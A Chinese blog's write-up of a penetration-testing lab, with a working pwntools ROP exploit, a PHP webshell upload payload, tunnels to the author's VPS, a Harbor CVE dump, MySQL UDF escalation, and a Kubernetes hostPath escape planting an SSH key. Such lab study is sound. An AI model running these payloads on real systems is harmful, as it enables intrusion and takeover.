<!doctype html><html lang=zh-cn dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>春秋GeatWall | 0raN9e's Blog</title><meta name=keywords content="thinkphp,shiro,横向移动,k8s"><meta name=description content="春秋GeatWall wp"><meta name=author content><link rel=canonical href=http://blog.0ran9e.cn/posts/%E6%B8%97%E9%80%8F/greatwall/><link crossorigin=anonymous href=/assets/css/stylesheet.e145e1800263554e97061ed241e405d710b6a0b880a196a0d6ba58b49d3b9010.css integrity="sha256-4UXhgAJjVU6XBh7SQeQF1xC2oLiAoZag1rpYtJ07kBA=" rel="preload stylesheet" as=style><link rel=icon href=http://blog.0ran9e.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://blog.0ran9e.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://blog.0ran9e.cn/favicon-32x32.png><link rel=apple-touch-icon href=http://blog.0ran9e.cn/apple-touch-icon.png><link rel=mask-icon href=http://blog.0ran9e.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=http://blog.0ran9e.cn/posts/%E6%B8%97%E9%80%8F/greatwall/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://blog.0ran9e.cn/posts/%E6%B8%97%E9%80%8F/greatwall/"><meta property="og:site_name" content="0raN9e's Blog"><meta property="og:title" content="春秋GeatWall"><meta property="og:description" content="春秋GeatWall wp"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-05-19T00:00:00+00:00"><meta property="article:modified_time" content="2025-05-19T00:00:00+00:00"><meta property="article:tag" content="Thinkphp"><meta property="article:tag" content="Shiro"><meta property="article:tag" content="横向移动"><meta property="article:tag" content="K8s"><meta name=twitter:card content="summary"><meta name=twitter:title content="春秋GeatWall"><meta name=twitter:description content="春秋GeatWall wp"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://blog.0ran9e.cn/posts/"},{"@type":"ListItem","position":3,"name":"春秋GeatWall","item":"http://blog.0ran9e.cn/posts/%E6%B8%97%E9%80%8F/greatwall/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"春秋GeatWall","name":"春秋GeatWall","description":"春秋GeatWall wp","keywords":["thinkphp","shiro","横向移动","k8s"],"articleBody":"flag01 利用fscan进行扫描发现有thinkphp,利用工具扫描getshell连接拿到flag1\n上传fscan在内网扫描一下内容\n用ai总结了一下\nIP地址 开放端口/服务 版本/系统信息 漏洞名称 风险等级 利用方式/影响 修复建议 172.28.23.26 21/FTP (vsFTPd) vsFTPd 3.0.3 (Ubuntu) 匿名登录漏洞 中高危 可下载OASystem.zip，泄露敏感数据 禁用匿名登录，检查并删除暴露文件 22/SSH OpenSSH 7.2p2 Ubuntu 暂无直接漏洞 低 - 升级OpenSSH，禁用密码登录 80/HTTP (Apache) Apache 2.4.18 新翔OA管理系统（暴露联系方式） 中 可能存在业务逻辑漏洞 检查Web应用安全性，限制敏感信息暴露 172.28.23.33 22/SSH OpenSSH 8.2p1 Ubuntu 暂无直接漏洞 低 - 升级OpenSSH，禁用密码登录 8080/HTTP (SpringBoot) 智联科技ERP后台 SpringBoot Actuator堆转储泄露 高危 泄露内存数据（如数据库密码） 关闭Actuator未授权访问，修改敏感凭据 SpringBoot Env未授权访问 高危 读取环境变量、配置信息 限制/env端点访问权限 172.28.23.17 22/SSH OpenSSH 8.2p1 Ubuntu 暂无直接漏洞 低 - 升级OpenSSH，禁用密码登录 80/HTTP (Apache) Apache 2.4.41 无标题页面（需进一步测试） 待定 - 检查网站内容，确认是否存在隐藏漏洞 8080/HTTP (ThinkPHP) ThinkPHP 5.0.23 ThinkPHP 5.0.23远程代码执行（RCE） 严重 直接获取服务器控制权 立即升级ThinkPHP或禁用该端口 flag03 先对33分析一下，扫描一下内容\n下载一下heapdump看一下内容\njava -jar JDumpSpider-1.1-SNAPSHOT-full.jar C:\\Users\\0raN9e\\Desktop\\春秋云镜\\heapdump ===========================================\rCookieRememberMeManager(ShiroKey)\r-------------\ralgMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES\r=========================================== 写一个shiro内存马进去\n看了一下不是root权限\n/home/ops01 \u003els HashNote 下载下来分析一下\n是一个pwn题，不会pwn直接用网上的脚本跑一下吧\n/ \u003enetstat -antlp Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:59696 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 172.28.23.33:58428 100.100.0.3:80 TIME_WAIT - tcp 0 0 172.28.23.33:50218 100.100.145.133:80 TIME_WAIT - tcp 0 0 172.28.23.33:46490 100.100.145.133:80 TIME_WAIT - tcp 0 0 172.28.23.33:59764 100.100.145.133:80 TIME_WAIT - tcp 0 0 172.28.23.33:53762 100.100.30.25:80 ESTABLISHED - tcp 0 0 172.28.23.33:57550 100.100.145.133:80 TIME_WAIT - tcp6 0 0 :::8080 :::* LISTEN 667/java tcp6 0 0 172.28.23.33:8080 172.28.23.17:60456 ESTABLISHED 667/java (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) from pwn import * context.arch='amd64' def add(key,data='b'): p.sendlineafter(b'Option:',b'1') p.sendlineafter(b'Key:',key) p.sendlineafter(b'Data:',data) def show(key): p.sendlineafter(b'Option:',b'2') p.sendlineafter(b\"Key: \",key); def edit(key,data): p.sendlineafter(b'Option:',b'3') p.sendlineafter(b'Key:',key) p.sendlineafter(b'Data:',data) def name(username): p.sendlineafter(b'Option:',b'4') p.sendlineafter(b'name:',username) p = remote('172.28.23.33', 59696) # p = process('./HashNote') username=0x5dc980 stack=0x5e4fa8 ukey=b'\\x30'*5+b'\\x31'+b'\\x44' fake_chunk=flat({ 0:username+0x10, 0x10:[username+0x20,len(ukey),\\ ukey,0], 0x30:[stack,0x10] },filler=b'\\x00') p.sendlineafter(b'name',fake_chunk) p.sendlineafter(b'word','freep@ssw0rd:3') add(b'\\x30'*1+b'\\x31'+b'\\x44',b'test') # 126 add(b'\\x30'*2+b'\\x31'+b'\\x44',b'test') # 127 show(ukey) main_ret=u64(p.read(8))-0x1e0 rdi=0x0000000000405e7c # pop rdi ; ret rsi=0x000000000040974f # pop rsi ; ret rdx=0x000000000053514b # pop rdx ; pop rbx ; ret rax=0x00000000004206ba # pop rax ; ret syscall=0x00000000004560c6 # syscall fake_chunk=flat({ 0:username+0x20, 0x20:[username+0x30,len(ukey),\\ ukey,0], 0x40:[main_ret,0x100,b'/bin/sh\\x00'] },filler=b'\\x00') name(fake_chunk.ljust(0x80,b'\\x00')) payload=flat([ rdi,username+0x50, rsi,0, rdx,0,0, rax,0x3b, syscall ]) p.sendlineafter(b'Option:',b'3') p.sendlineafter(b'Key:',ukey) p.sendline(payload) p.sendlineafter(b'Option:',b'9') p.interactive() flag03: flag{6a326f94-6526-4586-8233-152d137281fd} flag02 直接匿名登录\n└─# proxychains4 ftp 172.28.23.26 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.17 [proxychains] Dynamic chain ... 27.25.151.99:6000 ... 172.28.23.26:21 ... OK Connected to 172.28.23.26. 220 (vsFTPd 3.0.3) Name (172.28.23.26:orange): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e dir 229 Entering Extended Passive Mode (|||53964|) [proxychains] Dynamic chain ... 27.25.151.99:6000 ... 172.28.23.26:53964 ... OK 150 Here comes the directory listing. -rw-r--r-- 1 0 0 7536672 Mar 23 2024 OASystem.zip get OASystem.zip 解压分析一下内容\n\u003c?php /** * Description: PhpStorm. * Author: yoby * DateTime: 2018/12/4 18:01 * Email:logove@qq.com * Copyright Yoby版权所有 */ $img = $_POST['imgbase64']; if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $img, $result)) { $type = \".\".$result[2]; $path = \"upload/\" . date(\"Y-m-d\") . \"-\" . uniqid() . $type; } $img = base64_decode(str_replace($result[1], '', $img)); @file_put_contents($path, $img); exit('{\"src\":\"'.$path.'\"}'); 根目录有uploadbase64.php，会匹配data:image/;base64,，以作为文件后缀，base64_decode(）作为文件内容写入\nPOST /uploadbase64.php HTTP/1.1 Host: 172.28.23.26 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 76 imgbase64=data:image/php;base64,PD89YCRfR0VUWzFdYDtldmFsKCRfUE9TVFsxXSk7Pz4= 写入命令发现回显是ret=127\n尝试蚁剑插件提权LD可以进行提权，修改一下.antproxy.php第31行的包含文件，加一个upload目录，然后把文件改一下，这里好像只支持GET的传参，在前端进行命令执行，为www-data\n执行提权find / -perm -4000 -type f -exec ls -la {} 2\u003e/dev/null \\;\n-rwsr-xr-x 1 root root 30800 Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 44680 May 8 2014 /bin/ping6 -rwsr-xr-x 1 root root 40152 Jan 27 2020 /bin/mount -rwsr-xr-x 1 root root 40128 Aug 31 2019 /bin/su -rwsr-xr-x 1 root root 44168 May 8 2014 /bin/ping -rwsr-xr-x 1 root root 27608 Jan 27 2020 /bin/umount -rwsr-xr-x 1 root root 71824 Aug 31 2019 /usr/bin/chfn -rwsr-xr-x 1 root root 39904 Aug 31 2019 /usr/bin/newgrp -rwsr-xr-x 1 root root 75304 Aug 31 2019 /usr/bin/gpasswd -rwsr-sr-x 1 daemon daemon 51464 Jan 15 2016 /usr/bin/at -rwsr-xr-- 1 root stapusr 173376 Apr 3 2016 /usr/bin/staprun -rwsr-xr-x 1 root root 39664 Mar 3 2017 /usr/bin/base32 -rwsr-xr-x 1 root root 54256 Aug 31 2019 /usr/bin/passwd -rwsr-xr-x 1 root root 40432 Aug 31 2019 /usr/bin/chsh -rwsr-xr-x 1 root root 136808 Jan 21 2021 /usr/bin/sudo -rwsr-xr-- 1 root messagebus 42992 Jun 12 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 428240 May 27 2020 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 10232 Mar 27 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 10104 Jan 2 2016 /usr/lib/s-nail/s-nail-privsep http://172.28.23.26/upload/.antproxy.php?1=system(\"base32 /flag02.txt\"); flag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28} 看一下ifconfig的内容发现是有两个ip的，有二层\n上传fscan扫一下内容\n./fscan -h 172.22.14.0/24 扫到的主要内容是\n172.22.14.37（Linux）：\nSSH（22端口）：OpenSSH 7.6p1 2379端口（可能是 etcd）和 10250端口（可能是 Kubernetes API） 172.22.14.46（Linux）：\nHTTP（80端口）：运行 Harbor\n需要二层代理转发\nflag5 frp我这里多层代理转发一直有问题，所以我换了stowaway\n在个人vps上执行\n./linux_x64_admin -l 2223 -s 2223 在第一层也就是靶机入口处执行\n./linux_x64_agent -c 27.25.151.99:2223 -s 2223 --reconnect 8 在第二层也就是oa系统内部\n./linux_x64_agent -c 172.28.23.17:8889 -s 2223 --reconnect 8 最后走个socks 6000端口一样打(确实方便好多)\n先针对172.22.14.46端口，打个cveCVE-2022-46463/harbor.py at main · 404tk/CVE-2022-46463\n简单的查看了信息\npython harbor.py http://172.22.14.46/ --dump harbor/secret --v2 里面存在一个run.sh还有一个flag文件，得到了flag5\nflag6 下载projectadmin镜像\n查看到run.sh\n#!/bin/bash sleep 1 # start java -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar /usr/bin/tail -f /dev/null 找到ProjectAdmin-0.0.1-SNAPSHOT.jar然后反编译\nmkdir unpacked cd unpacked jar -xf ../ProjectAdmin-0.0.1-SNAPSHOT.jar 可以得到数据库的信息\nspring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8\u0026useUnicode=true\u0026serverTimezone=UTC spring.datasource.username=root spring.datasource.password=My3q1i4oZkJm3 spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver mybatis.type-aliases-package=com.smartlink.projectadmin.entity mybatis.mapper-locations=classpath:mybatis/mapper/*.xml 直接用用MDUT进行UDF提权拿到flag6\nflag4 之后对172.22.14.37进行扫描，先上传\nfscan -h 172.22.14.37 -p 1-65535 D:\\ONE-FOX集成工具箱_V8.2公开版_by狐狸\\gui_scan\\fscan\u003efscan -h 172.22.14.37 -p 1-65535 ┌──────────────────────────────────────────────┐ │ ___ _ │ │ / _ \\ ___ ___ _ __ __ _ ___| | __ │ │ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / │ │ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c │ │ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ └──────────────────────────────────────────────┘ Fscan Version: 2.0.0 [2025-05-19 16:53:10] [INFO] 暴力破解线程数: 1 [2025-05-19 16:53:11] [INFO] 开始信息扫描 [2025-05-19 16:53:11] [INFO] 最终有效主机数量: 1 [2025-05-19 16:53:11] [INFO] 开始主机扫描 [2025-05-19 16:53:11] [INFO] 有效端口数量: 65535 [2025-05-19 16:53:11] [SUCCESS] 端口开放 172.22.14.37:22 [2025-05-19 16:53:11] [SUCCESS] 服务识别 172.22.14.37:22 =\u003e [ssh] 版本:7.6p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7.] [2025-05-19 16:54:39] [SUCCESS] 端口开放 172.22.14.37:2380 [2025-05-19 16:54:39] [SUCCESS] 端口开放 172.22.14.37:2379 [2025-05-19 16:54:49] [SUCCESS] 服务识别 172.22.14.37:2380 =\u003e [2025-05-19 16:54:54] [SUCCESS] 服务识别 172.22.14.37:2379 =\u003e [2025-05-19 16:57:10] [SUCCESS] 端口开放 172.22.14.37:6443 [2025-05-19 16:58:05] [SUCCESS] 服务识别 172.22.14.37:6443 =\u003e 存在 Kubernetes API server 未授权\n{ \"paths\": [ \"/api\", \"/api/v1\", \"/apis\", \"/apis/\", \"/apis/admissionregistration.k8s.io\", \"/apis/admissionregistration.k8s.io/v1\", \"/apis/admissionregistration.k8s.io/v1beta1\", \"/apis/apiextensions.k8s.io\", \"/apis/apiextensions.k8s.io/v1\", \"/apis/apiextensions.k8s.io/v1beta1\", \"/apis/apiregistration.k8s.io\", \"/apis/apiregistration.k8s.io/v1\", \"/apis/apiregistration.k8s.io/v1beta1\", \"/apis/apps\", \"/apis/apps/v1\", \"/apis/authentication.k8s.io\", \"/apis/authentication.k8s.io/v1\", \"/apis/authentication.k8s.io/v1beta1\", \"/apis/authorization.k8s.io\", \"/apis/authorization.k8s.io/v1\", \"/apis/authorization.k8s.io/v1beta1\", \"/apis/autoscaling\", \"/apis/autoscaling/v1\", \"/apis/autoscaling/v2beta1\", \"/apis/autoscaling/v2beta2\", \"/apis/batch\", \"/apis/batch/v1\", \"/apis/batch/v1beta1\", \"/apis/certificates.k8s.io\", \"/apis/certificates.k8s.io/v1beta1\", \"/apis/coordination.k8s.io\", \"/apis/coordination.k8s.io/v1\", \"/apis/coordination.k8s.io/v1beta1\", \"/apis/events.k8s.io\", \"/apis/events.k8s.io/v1beta1\", \"/apis/extensions\", \"/apis/extensions/v1beta1\", \"/apis/networking.k8s.io\", \"/apis/networking.k8s.io/v1\", \"/apis/networking.k8s.io/v1beta1\", \"/apis/node.k8s.io\", \"/apis/node.k8s.io/v1beta1\", \"/apis/policy\", \"/apis/policy/v1beta1\", \"/apis/rbac.authorization.k8s.io\", \"/apis/rbac.authorization.k8s.io/v1\", \"/apis/rbac.authorization.k8s.io/v1beta1\", \"/apis/scheduling.k8s.io\", \"/apis/scheduling.k8s.io/v1\", \"/apis/scheduling.k8s.io/v1beta1\", \"/apis/storage.k8s.io\", \"/apis/storage.k8s.io/v1\", \"/apis/storage.k8s.io/v1beta1\", \"/healthz\", \"/healthz/autoregister-completion\", \"/healthz/etcd\", \"/healthz/log\", \"/healthz/ping\", \"/healthz/poststarthook/apiservice-openapi-controller\", \"/healthz/poststarthook/apiservice-registration-controller\", \"/healthz/poststarthook/apiservice-status-available-controller\", \"/healthz/poststarthook/bootstrap-controller\", \"/healthz/poststarthook/ca-registration\", \"/healthz/poststarthook/crd-informer-synced\", \"/healthz/poststarthook/generic-apiserver-start-informers\", \"/healthz/poststarthook/kube-apiserver-autoregistration\", \"/healthz/poststarthook/rbac/bootstrap-roles\", \"/healthz/poststarthook/scheduling/bootstrap-system-priority-classes\", \"/healthz/poststarthook/start-apiextensions-controllers\", \"/healthz/poststarthook/start-apiextensions-informers\", \"/healthz/poststarthook/start-kube-aggregator-informers\", \"/healthz/poststarthook/start-kube-apiserver-admission-initializer\", \"/livez\", \"/livez/autoregister-completion\", \"/livez/etcd\", \"/livez/log\", \"/livez/ping\", \"/livez/poststarthook/apiservice-openapi-controller\", \"/livez/poststarthook/apiservice-registration-controller\", \"/livez/poststarthook/apiservice-status-available-controller\", \"/livez/poststarthook/bootstrap-controller\", \"/livez/poststarthook/ca-registration\", \"/livez/poststarthook/crd-informer-synced\", \"/livez/poststarthook/generic-apiserver-start-informers\", \"/livez/poststarthook/kube-apiserver-autoregistration\", \"/livez/poststarthook/rbac/bootstrap-roles\", \"/livez/poststarthook/scheduling/bootstrap-system-priority-classes\", \"/livez/poststarthook/start-apiextensions-controllers\", \"/livez/poststarthook/start-apiextensions-informers\", \"/livez/poststarthook/start-kube-aggregator-informers\", \"/livez/poststarthook/start-kube-apiserver-admission-initializer\", \"/logs\", \"/metrics\", \"/openapi/v2\", \"/readyz\", \"/readyz/autoregister-completion\", \"/readyz/etcd\", \"/readyz/log\", \"/readyz/ping\", \"/readyz/poststarthook/apiservice-openapi-controller\", \"/readyz/poststarthook/apiservice-registration-controller\", \"/readyz/poststarthook/apiservice-status-available-controller\", \"/readyz/poststarthook/bootstrap-controller\", \"/readyz/poststarthook/ca-registration\", \"/readyz/poststarthook/crd-informer-synced\", \"/readyz/poststarthook/generic-apiserver-start-informers\", \"/readyz/poststarthook/kube-apiserver-autoregistration\", \"/readyz/poststarthook/rbac/bootstrap-roles\", \"/readyz/poststarthook/scheduling/bootstrap-system-priority-classes\", \"/readyz/poststarthook/start-apiextensions-controllers\", \"/readyz/poststarthook/start-apiextensions-informers\", \"/readyz/poststarthook/start-kube-aggregator-informers\", \"/readyz/poststarthook/start-kube-apiserver-admission-initializer\", \"/readyz/shutdown\", \"/version\" ] } PS E:\\tools\u003e kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods Please enter Username: test Please enter Password: NAME READY STATUS RESTARTS AGE nginx-deployment-864f8bfd6f-697jq 1/1 Running 0 61s 写一个yaml\napiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment labels: app: nginx spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:1.8 volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / PS E:\\tools\u003e kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f aaa.yaml Please enter Username: test Please enter Password: deployment.apps/nginx-deployment configured PS E:\\tools\u003e kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment-864f8bfd6f-697jq /bin/bash kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead. Please enter Username: test root@nginx-deployment-864f8bfd6f-697jq:/# ls root@nginx-deployment-864f8bfd6f-697jq:/# id uid=0(root) gid=0(root) groups=0(root) 写个ssh进去\nroot@nginx-deployment-864f8bfd6f-697jq:/# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQ................................ root@kali' \u003e /mnt/root/.ssh/authorized_keys root@ubuntu-k8s:~# ls -al total 56 drwx------ 8 root root 4096 Mar 17 16:32 . drwxr-xr-x 22 root root 4096 May 19 16:21 .. lrwxrwxrwx 1 root root 9 Mar 17 16:32 .bash_history -\u003e /dev/null -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwx------ 3 root root 4096 Jul 18 2023 .cache drwx------ 3 root root 4096 Jul 18 2023 .gnupg drwxr-xr-x 4 root root 4096 Mar 17 15:53 .kube drwxr-xr-x 14 root root 4096 Mar 17 15:49 metarget -rw------- 1 root root 1136 Mar 25 2024 .mysql_history -rw-r--r-- 1 root root 295 Mar 17 16:11 nginx-deployment.yaml drwxr-xr-x 2 root root 4096 Jul 18 2023 .pip -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 206 May 19 16:21 .pydistutils.cfg -rw------- 1 root root 7 Mar 17 15:47 .python_history drwx------ 2 root root 4096 Jul 18 2023 .ssh 查看一下内容得到了\nroot@ubuntu-k8s:~# cat .mysql_history _HiStOrY_V2_ show\\040databases; create\\040database\\040flaghaha; use\\040flaghaha DROP\\040TABLE\\040IF\\040EXISTS\\040`f1ag`; CREATE\\040TABLE\\040`flag06`\\040( `id`\\040int\\040DEFAULT\\040NULL, \\040\\040`f1agggggishere`\\040varchar(255)\\040DEFAULT\\040NULL )\\040ENGINE=MyISAM\\040DEFAULT\\040CHARSET=utf8; CREATE\\040TABLE\\040`flag06`\\040(\\040`id`\\040int\\040DEFAULT\\040NULL,\\040\\040\\040`f1agggggishere`\\040varchar(255)\\040DEFAULT\\040NULL\\040)\\040ENGINE=MyISAM\\040DEFAULT\\040CHARSET=utf8; show\\040tables; drop\\040table\\040flag06; DROP\\040TABLE\\040IF\\040EXISTS\\040`f1ag`; CREATE\\040TABLE\\040`flag04`\\040( `id`\\040int\\040DEFAULT\\040NULL, \\040\\040`f1agggggishere`\\040varchar(255)\\040DEFAULT\\040NULL )\\040ENGINE=MyISAM\\040DEFAULT\\040CHARSET=utf8; CREATE\\040TABLE\\040`flag04`\\040(\\040`id`\\040int\\040DEFAULT\\040NULL,\\040\\040\\040`f1agggggishere`\\040varchar(255)\\040DEFAULT\\040NULL\\040)\\040ENGINE=MyISAM\\040DEFAULT\\040CHARSET=utf8; INSERT\\040INTO\\040`flag`\\040VALUES\\040(1,\\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg=='); INSERT\\040INTO\\040`flag04`\\040VALUES\\040(1,\\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg=='); exit 解码一下得到flag\nflag{da69c459-7fe5-4535-b8d1-15fff496a29f} ","wordCount":"2840","inLanguage":"zh-cn","datePublished":"2025-05-19T00:00:00Z","dateModified":"2025-05-19T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.0ran9e.cn/posts/%E6%B8%97%E9%80%8F/greatwall/"},"publisher":{"@type":"Organization","name":"0raN9e's Blog","logo":{"@type":"ImageObject","url":"http://blog.0ran9e.cn/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://blog.0ran9e.cn/ accesskey=h title="0raN9e's Blog (Alt + H)">0raN9e's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://blog.0ran9e.cn/ title=首页><span>首页</span></a></li><li><a href=http://blog.0ran9e.cn/archives/ title=归档><span>归档</span></a></li><li><a href=http://blog.0ran9e.cn/tags/ title=标签><span>标签</span></a></li><li><a href=http://blog.0ran9e.cn/search/ title=搜索><span>搜索</span></a></li><li><a href=http://blog.0ran9e.cn/about/ title=关于><span>关于</span></a></li><li><a href=http://blog.0ran9e.cn/links/ title=友链><span>友链</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><span title='2025-05-19 00:00:00 +0000 UTC'>May 19, 2025</span>&nbsp;·&nbsp;<span>6 min</span><h1 class=post-title>春秋GeatWall</h1></header><div class=pm-layout><div class=pm-main><div class=post-content><h1 id=flag01>flag01</h1><p>利用fscan进行扫描发现有thinkphp,利用工具扫描getshell连接拿到flag1<img alt=2025-05-02211331 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-02211331.png></p><p><img alt=2025-05-02211435 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-02211435.png></p><p>上传fscan在内网扫描一下内容</p><p>用ai总结了一下</p><table><thead><tr><th style=text-align:left><strong>IP地址</strong></th><th style=text-align:left><strong>开放端口/服务</strong></th><th style=text-align:left><strong>版本/系统信息</strong></th><th style=text-align:left><strong>漏洞名称</strong></th><th style=text-align:left><strong>风险等级</strong></th><th style=text-align:left><strong>利用方式/影响</strong></th><th style=text-align:left><strong>修复建议</strong></th></tr></thead><tbody><tr><td style=text-align:left><strong>172.28.23.26</strong></td><td style=text-align:left>21/FTP (vsFTPd)</td><td style=text-align:left>vsFTPd 3.0.3 (Ubuntu)</td><td style=text-align:left>匿名登录漏洞</td><td style=text-align:left>中高危</td><td style=text-align:left>可下载<code>OASystem.zip</code>，泄露敏感数据</td><td style=text-align:left>禁用匿名登录，检查并删除暴露文件</td></tr><tr><td style=text-align:left></td><td style=text-align:left>22/SSH</td><td style=text-align:left>OpenSSH 7.2p2 Ubuntu</td><td style=text-align:left>暂无直接漏洞</td><td style=text-align:left>低</td><td style=text-align:left>-</td><td style=text-align:left>升级OpenSSH，禁用密码登录</td></tr><tr><td style=text-align:left></td><td style=text-align:left>80/HTTP (Apache)</td><td style=text-align:left>Apache 2.4.18</td><td style=text-align:left>新翔OA管理系统（暴露联系方式）</td><td style=text-align:left>中</td><td style=text-align:left>可能存在业务逻辑漏洞</td><td style=text-align:left>检查Web应用安全性，限制敏感信息暴露</td></tr><tr><td style=text-align:left><strong>172.28.23.33</strong></td><td style=text-align:left>22/SSH</td><td style=text-align:left>OpenSSH 8.2p1 Ubuntu</td><td style=text-align:left>暂无直接漏洞</td><td style=text-align:left>低</td><td style=text-align:left>-</td><td style=text-align:left>升级OpenSSH，禁用密码登录</td></tr><tr><td style=text-align:left></td><td style=text-align:left>8080/HTTP (SpringBoot)</td><td style=text-align:left>智联科技ERP后台</td><td style=text-align:left>SpringBoot Actuator堆转储泄露</td><td style=text-align:left>高危</td><td style=text-align:left>泄露内存数据（如数据库密码）</td><td style=text-align:left>关闭Actuator未授权访问，修改敏感凭据</td></tr><tr><td style=text-align:left></td><td style=text-align:left></td><td style=text-align:left></td><td style=text-align:left>SpringBoot Env未授权访问</td><td style=text-align:left>高危</td><td style=text-align:left>读取环境变量、配置信息</td><td style=text-align:left>限制<code>/env</code>端点访问权限</td></tr><tr><td style=text-align:left><strong>172.28.23.17</strong></td><td style=text-align:left>22/SSH</td><td style=text-align:left>OpenSSH 8.2p1 Ubuntu</td><td style=text-align:left>暂无直接漏洞</td><td style=text-align:left>低</td><td style=text-align:left>-</td><td style=text-align:left>升级OpenSSH，禁用密码登录</td></tr><tr><td style=text-align:left></td><td style=text-align:left>80/HTTP (Apache)</td><td style=text-align:left>Apache 2.4.41</td><td 